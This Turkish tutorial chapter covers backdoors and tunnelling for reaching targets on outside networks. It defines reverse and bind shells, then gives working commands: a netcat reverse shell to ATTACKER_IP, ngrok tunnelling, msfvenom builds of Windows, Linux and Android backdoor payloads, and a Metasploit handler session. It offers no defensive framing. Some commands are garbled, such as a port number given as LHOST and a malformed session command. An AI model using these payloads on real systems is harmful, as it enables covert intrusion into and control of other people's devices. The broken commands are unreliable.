
# Bölüm 16: Dış Ağda Backdoor ve Tünel Servisleri

## 1️⃣ Backdoor (Arka Kapı) Nedir?

Backdoor (arka kapı), bir sisteme veya cihaza gizli erişim sağlamak için kullanılan bir yöntemdir. Genellikle güvenlik sistemlerini atlatarak uzaktan kontrol sağlamaya yarar.

### 🔹 Backdoor Çeşitleri

- ✅ **Reverse Shell (Ters Kabuk)**: Hedef sistemden saldırgana bağlantı başlatır.
- ✅ **Bind Shell (Bağlı Kabuk)**: Hedef sistemde bir port açar, saldırgan bu porta bağlanır.
- ✅ **Kalıcı Backdoor**: Sisteme her yeniden başlatıldığında çalışacak şekilde yerleştirilir.

---

## 2️⃣ Dış Ağda Backdoor Kullanımı

Hedef dış ağdaysa, bağlantı kurmak zorlaşabilir. Bunun için tünelleme servisleri veya port yönlendirme kullanılır.

### 📌 Kullanılan Yöntemler

- VPN veya Proxy
- Ngrok, LocalTunnel
- Metasploit Reverse Shell + NAT Bypass

---

## 3️⃣ Tünel Servisleri Nedir?

Tünel servisleri, iç ağdaki bir cihazın dış ağdan erişilebilir olmasını sağlar.

### 📌 Popüler Tünel Servisleri

- ✅ **Ngrok**: İç ağdaki portu internete açar
- ✅ **FRP**: Reverse proxy işlemleri yapar
- ✅ **Chisel**: SSH tabanlı port yönlendirme sağlar
- ✅ **Socat**: Ters kabuk bağlantıları için kullanılır

---

## Dış Ağda Erişim Yöntemleri

### 1️⃣ Doğrudan Bağlantı (Port Yönlendirme)

Açık portlara doğrudan bağlantı yapılabilir.

```bash
# Port tarama örnekleri
nmap -sS -Pn -p- <target_ip>
```

### 2️⃣ Reverse Shell (Ters Kabuk)

```bash
# Netcat ile reverse shell örneği
nc -e /bin/bash ATTACKER_IP 4444
```

### 3️⃣ Ngrok ile Tünelleme

```bash
# Ngrok ile 4444 portunu aç
ngrok tcp 4444
```

### 4️⃣ VPN / DNS Tünelleme

- **VPN** ile doğrudan iç ağa bağlanılır.
- **DNS Tünelleme** araçları: Iodine, DNScat2

---

## Msfvenom Kullanımı

Msfvenom, Metasploit Framework'e ait payload oluşturma aracıdır.

### 📌 Temel Format

```bash
msfvenom -p <PAYLOAD> -f <FORMAT> -o <OUTPUT_FILE>
```

### 🔹 Windows için Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe
```

### 🔹 Linux için Reverse Shell

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf
```

### 🔹 Android için APK Backdoor

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -o backdoor.apk
```

---

## Metasploit Kullanımı (Handler ve Exploit)

```bash
# Payload oluşturma
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=0.tcp.ngrok.io LPORT=11620 -f exe -o /root/newbackdoor.exe

# Metasploit başlatma
msfconsole

# Exploit ayarları
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 4242
exploit -j -z

# Oturumları listele
sessions -l

# Oturuma bağlan
session -2

# Meterpreter komutu örneği
meterpreter> ls
```

---

## 🔚 Özet

- **Port Yönlendirme**: Doğrudan bağlantı
- **Reverse Shell**: NAT arkasındaki hedefe geri bağlantı yaptırılır
- **Ngrok / Chisel**: Güvenli tünelleme
- **Msfvenom**: Zararlı dosya oluşturma
- **Metasploit**: Payload çalıştırma ve hedefe sızma
